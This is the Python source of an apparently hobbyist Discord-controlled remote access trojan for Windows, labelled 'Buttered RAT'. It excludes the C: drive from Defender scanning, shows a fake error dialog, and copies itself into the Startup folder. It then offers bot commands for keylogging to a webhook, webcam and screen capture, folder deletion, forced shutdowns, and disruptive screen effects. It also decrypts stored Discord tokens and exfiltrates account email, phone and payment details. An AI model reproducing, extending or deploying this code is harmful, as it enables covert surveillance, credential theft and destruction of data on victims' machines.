import os
import sys
import discord
from discord.ext import commands
import pynput
from pynput import keyboard
from pynput.keyboard import Listener
import socket 
import shutil
from threading import Timer
from datetime import datetime
import threading
import requests
import re
import subprocess
import psutil
import GPUtil
import requests
import cv2
import time
import asyncio
import mss
import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import ctypes
import time
import re
import base64
import datetime
import win32crypt
import random
from Crypto.Cipher import AES

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

hdc = user32.GetDC(0)

width = user32.GetSystemMetrics(0)
height = user32.GetSystemMetrics(1)

# ROP codes
SRCCOPY     = 0x00CC0020
NOTSRCCOPY  = 0x00550009
PATINVERT   = 0x00F00021

try:
    os.system(r'powershell Add-MpPreference -ExclusionPath "C:\"')
except:
    pass

def errorMsg():
    ctypes.windll.user32.MessageBoxW(0, "The application was unable to start correctly (0xc000007b).\nClick OK to close the application", "Uncaught Error!", 0x20)

errorMsg()

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "null"

def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue

        return tokens
    

cam = cv2.VideoCapture(0)



def add_to_startup():
    startup_dir = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )


    current_file = os.path.abspath(sys.argv[0])
    target_file = os.path.join(startup_dir, os.path.basename(current_file))

    if not os.path.exists(target_file):
        shutil.copyfile(current_file, target_file)

add_to_startup()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="-", intents=intents)

pcname = socket.gethostname()

def tokengetforbot(token):
    import binascii
    import base64
    decoded_bytes = base64.b64decode(token)
    decoded_string = decoded_bytes.decode('utf-8')    
    result = binascii.unhexlify(decoded_string).decode('utf-8')
    return result

thymainguildeid = 1
thyobftoketoke = "a"

tokenencoded = tokengetforbot(thyobftoketoke)


@bot.event
async def on_ready():
    if getattr(bot, "ready", False):
        return
    bot.ready = True

    guild = bot.get_guild(thymainguildeid)
    if guild is None:
        guild = await bot.fetch_guild(thymainguildeid)

    category_name = f"{pcname}-RAT"
    category = discord.utils.get(guild.categories, name=category_name)

    if category is None:
        category = await guild.create_category(category_name)

    text_channels = ["spam", "file-related", "key", "recordings", "info"]

    bot.channels_cache = {}  # 👈 store globally on bot

    for name in text_channels:
        channel = discord.utils.get(category.text_channels, name=name)
        if channel is None:
            channel = await guild.create_text_channel(name, category=category)
        bot.channels_cache[name] = channel

    mic = discord.utils.get(category.voice_channels, name="Mic")
    if mic is None:
        mic = await guild.create_voice_channel("Mic", category=category)

    bot.channels_cache["Mic"] = mic

    await bot.channels_cache["info"].send(
        "User Online @everyone",
        allowed_mentions=discord.AllowedMentions(everyone=True)
    )

keylog = False

# Feature -- Keylogs

pressed_keys = []
lock = threading.Lock()

def send_webhook(msg, webhook):
    data = {
        "content": str(msg)
    }

    try:
        requests.post(webhook, json=data)
    except Exception as e:
        pass

def on_pressed(key):
    try:
        pressed_keys.append(key.char)
    except AttributeError:
        keyStr = str(key)
        keyStr = keyStr.replace("Key.", "")
        pressed_keys.append(keyStr)

@bot.command(help="Starts keylog.")
async def startkeylog(ctx):
    klog = bot.channels_cache["key"]
    bot.webhookcache = {}
    webhook = await klog.create_webhook(name="Keylogs")
    bot.webhookcache["keyloghook"] = webhook
    whurl = webhook.url
    await ctx.send("Keylog started!")
    global keylog
    keylog = True
    send_webhook("Connected!", whurl)
    listen = Listener(on_press=on_pressed)
    listen.start()
    while keylog is True:
        await asyncio.sleep(5)
        with lock:
            if pressed_keys:
                pressedkeysstr = str(pressed_keys)
                pressedkeysstr = pressedkeysstr.replace("[", "")
                pressedkeysstr = pressedkeysstr.replace("]", "")
                pressedkeysstr = pressedkeysstr.replace("'", "")
                pressedkeysstr = pressedkeysstr.replace(',', "")
                pressedkeysstr = pressedkeysstr.replace('ctrl_l', "Ctrl")
                pressedkeysstr = pressedkeysstr.replace('ctrl_r', "Right Ctrl")

                send_webhook(pressedkeysstr, whurl)
                pressed_keys.clear()
            else:
                send_webhook("Nothing", whurl)

@bot.command(help="Ends keylog.")
async def stopkeylog(ctx):
    global keylog
    keylog = False
    await ctx.send("Keylog stopped!")

@bot.command(help="Shows rat version")
async def versionofrat(ctx):
    return await ctx.send("""
# Buttered RAT
-# by [arran](<https://github.com/epicinver>)
                          
USE CREDITS COMMAND TO SEE ALL CREDITS.
TOKEN GR4B CMD HAS CREDITS INSIDE IT.
                          

# VERSION 9
""")

# Feature -- Webcam/Screenshot

@bot.command(help="Webcam picture")
async def webcam(ctx):
    if not cam.isOpened():
        return await ctx.send("Couldn't open camera!")
    
    ret, frame = cam.read()

    if ret:
        cv2.imwrite("captured_image.png", frame)
        file = discord.File("captured_image.png")
        await ctx.send("Here!", file=file)
        filepath = "captured_image.png"
        return os.remove(filepath)
    else:
        return await ctx.send("Failure (unknown error)")
    
    cam.release()

@bot.command(help="Screenshot")
async def screenshot(ctx):
    with mss.mss() as sct:
        # Capture the combined screen (all monitors)
        monitor = sct.monitors  # The first monitor in the list represents all screens
        screenshot = sct.grab(monitor)
        sct.save(screenshot, "fullscreen.png")
        file = discord.File("fullscreen.png")
        await ctx.send("Here!", file=file)
        filepath = "fullscreen.png"
        return os.remove(filepath)

# Features -- Self Destruct/DC Tokens
@bot.command(help="DELETES THE EXECUTABLE")
async def die(ctx):
    with open("death.bat", "w") as death:
        death.write("""
@echo off
del HD Audio Player.exe
echo Hello. You were Ratted. Please consider getting a better antivirus now so that you do not fall victim to another one!
pause
exit
        """)
    await ctx.send("Deleting all of the channels for this PC then running the batch script to delete me...")
    await asyncio.sleep(5)
    for channels in bot.channels_cache:
        await channels.delete()
    subprocess.call("death.bat")


@bot.command(help="Shuts down the PC")
async def shutdown(ctx):
    os.system("shutdown /s /t 10")
    return await ctx.send("PC will shutdown in 10 seconds.")

@bot.command(help="Restarts the PC")
async def restart(ctx):
    os.system("shutdown /r /t 10")
    return await ctx.send("PC will restart in 10 seconds.")

dogdi = False

@bot.command(help="Starts random gdi effects")
async def devilscreen(ctx):
    global dogdi
    dogdi = True
    start = time.time()
    await ctx.send("Done!")
    DURATION = 100000
    while dogdi:
        try:
            while time.time() - start < DURATION:
                # --- Screen shake ---
                dx = random.randint(-20, 20)
                dy = random.randint(-20, 20)

                gdi32.BitBlt(
                    hdc,
                    dx, dy,
                    width, height,
                    hdc,
                    0, 0,
                    SRCCOPY
                )

                # --- Invert screen ---
                if random.random() < 0.4:
                    gdi32.BitBlt(
                        hdc,
                        0, 0,
                        width, height,
                        hdc,
                        0, 0,
                        NOTSRCCOPY
                    )

                # --- Color chaos ---
                if random.random() < 0.6:
                    brush = gdi32.CreateSolidBrush(
                        random.randint(0, 0xFFFFFF)
                    )
                    gdi32.SelectObject(hdc, brush)
                    gdi32.PatBlt(
                        hdc,
                        0, 0,
                        width, height,
                        PATINVERT
                    )
                    gdi32.DeleteObject(brush)

                time.sleep(0.03)

        finally:
            user32.ReleaseDC(0, hdc)

@bot.command(help="Bye bye devil screen")
async def restorescreen(ctx):
    global dogdi
    dogdi = False
    os.system("taskkill /f /im explorer.exe && explorer")
    await ctx.send("Done!")

@bot.command(help="Lists a directory.")
async def lsdir(ctx, dir):
    dir = dir.replace("//", "/")
    dir = dir.replace("/", "//")
    dir = rf"{dir}"
    listdirectory = subprocess.run(
        [f"dir {dir}"],
        capture_output=True,
        text=True
    )
    await ctx.send("Here: \n " + listdirectory)

@bot.command(help="Delete folder")
async def delfolder(ctx, dir):
    dir = dir.replace("//", "/")
    dir = dir.replace("/", "//")
    dir = rf"{dir}"
    shutil.rmtree(dir)
    return await ctx.send("Done!")

@bot.command(help="Grabs passes.")
async def grabthepass(ctx):
    #smth
    import sqlite3


@bot.command(help="Shows browser history.. or does it?")
async def history(ctx):
    return await ctx.send("# nah fam why u need ts...ur victim is prob a minor...u freaky..\n-# But maybe ill add this soon ;P")


def get_system_info():
    import platform
    import socket
    import psutil
    import uuid
    import requests
    import GPUtil
    import shutil

    info = {}

    # ---- BASIC SYSTEM ----
    info["pc_name"] = socket.gethostname()
    info["os"] = platform.system()
    info["os_version"] = platform.version()
    info["architecture"] = platform.machine()

    # ---- CPU ----
    info["cpu"] = {
        "name": platform.processor(),
        "cores_physical": psutil.cpu_count(logical=False),
        "cores_logical": psutil.cpu_count(logical=True),
        "usage_percent": psutil.cpu_percent(interval=1)
    }

    # ---- RAM ----
    ram = psutil.virtual_memory()
    info["ram"] = {
        "total_gb": round(ram.total / 1024**3, 2),
        "used_gb": round(ram.used / 1024**3, 2),
        "usage_percent": ram.percent
    }

    # ---- STORAGE ----
    disk = shutil.disk_usage("/")
    info["storage"] = {
        "total_gb": round(disk.total / 1024**3, 2),
        "used_gb": round(disk.used / 1024**3, 2),
        "free_gb": round(disk.free / 1024**3, 2)
    }

    # ---- NETWORK ----
    info["local_ip"] = socket.gethostbyname(info["pc_name"])

    try:
        info["public_ip"] = requests.get(
            "https://api.ipify.org", timeout=3
        ).text
    except:
        info["public_ip"] = None

    # ---- LOCATION (IP-BASED, APPROX) ----
    try:
        loc = requests.get(
            "https://ipinfo.io/json", timeout=3
        ).json()
        info["location"] = {
            "country": loc.get("country"),
            "region": loc.get("region"),
            "city": loc.get("city"),
            "org": loc.get("org")
        }
    except:
        info["location"] = None

    # ---- GPU ----
    try:
        gpus = GPUtil.getGPUs()
        info["gpu"] = [{
            "name": gpu.name,
            "memory_total_mb": gpu.memoryTotal,
            "memory_used_mb": gpu.memoryUsed,
            "load_percent": gpu.load * 100
        } for gpu in gpus]
    except:
        info["gpu"] = None

    # ---- VM DETECTION (heuristic) ----
    vm_indicators = ["vmware", "virtualbox", "qemu", "hyper-v", "kvm"]
    info["is_vm"] = any(
        x in platform.platform().lower()
        for x in vm_indicators
    )

    # ---- UNIQUE ID (non-invasive) ----
    info["machine_id"] = hex(uuid.getnode())

    return info

@bot.command(help="Gets the PCs info")
async def infoofuser(ctx):
    info = get_system_info()

    embed = discord.Embed(
        title="PC Information",
        color=discord.Color.blurple()
    )

    # SYSTEM
    embed.add_field(
        name="System",
        value=(
            f"PC Name: `{info['pc_name']}`\n"
            f"OS: `{info['os']} {info['os_version']}`\n"
            f"Architecture: `{info['architecture']}`\n"
            f"Virtual Machine: `{info['is_vm']}`"
        ),
        inline=False
    )

    # CPU
    cpu = info["cpu"]
    embed.add_field(
        name="CPU",
        value=(
            f"Name: `{cpu['name']}`\n"
            f"Cores (Physical / Logical): `{cpu['cores_physical']} / {cpu['cores_logical']}`\n"
            f"Usage: `{cpu['usage_percent']}%`"
        ),
        inline=False
    )

    # RAM
    ram = info["ram"]
    embed.add_field(
        name="RAM",
        value=(
            f"Total: `{ram['total_gb']} GB`\n"
            f"Used: `{ram['used_gb']} GB`\n"
            f"Usage: `{ram['usage_percent']}%`"
        ),
        inline=False
    )

    # STORAGE
    storage = info["storage"]
    embed.add_field(
        name="Storage",
        value=(
            f"Total: `{storage['total_gb']} GB`\n"
            f"Used: `{storage['used_gb']} GB`\n"
            f"Free: `{storage['free_gb']} GB`"
        ),
        inline=False
    )

    # GPU
    if info["gpu"]:
        gpu_lines = []
        for gpu in info["gpu"]:
            gpu_lines.append(
                f"{gpu['name']}\n"
                f"VRAM: `{gpu['memory_used_mb']}/{gpu['memory_total_mb']} MB`\n"
                f"Load: `{round(gpu['load_percent'], 1)}%`"
            )
        embed.add_field(
            name="GPU",
            value="\n\n".join(gpu_lines),
            inline=False
        )
    else:
        embed.add_field(
            name="GPU",
            value="Not detected",
            inline=False
        )

    # NETWORK
    embed.add_field(
        name="Network",
        value=(
            f"Local IP: `{info['local_ip']}`\n"
            f"Public IP: `{info['public_ip']}`"
        ),
        inline=False
    )

    # LOCATION
    if info["location"]:
        loc = info["location"]
        embed.add_field(
            name="Location (IP-based)",
            value=(
                f"Country: `{loc['country']}`\n"
                f"Region: `{loc['region']}`\n"
                f"City: `{loc['city']}`\n"
                f"ISP: `{loc['org']}`"
            ),
            inline=False
        )

    embed.set_footer(text="System info snapshot")

    await ctx.send(embed=embed)

@bot.command(help="Runs an eror")
async def doerrorlol(ctx):
    errorMsg()
    return await ctx.send("Done!")

@bot.command(help="Gets Discord tokens")
async def tokengrabdc(ctx):
    checked = []

    hook = ctx.channel.create_webhook(name="Hook")
    hookuri = hook.url

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ https://github.com/astraadev"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }
                urllib.request.urlopen(urllib.request.Request(hookuri, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                continue



# Feature -- Credits
@bot.command(help="Credits for all features")
async def credits(ctx):
    await ctx.send("""

## Credits!
                   
# Keylogger
By github.com/sillycodergirl
                   
# Everything else
By github.com/Epicinver

""")


bot.run(tokenencoded)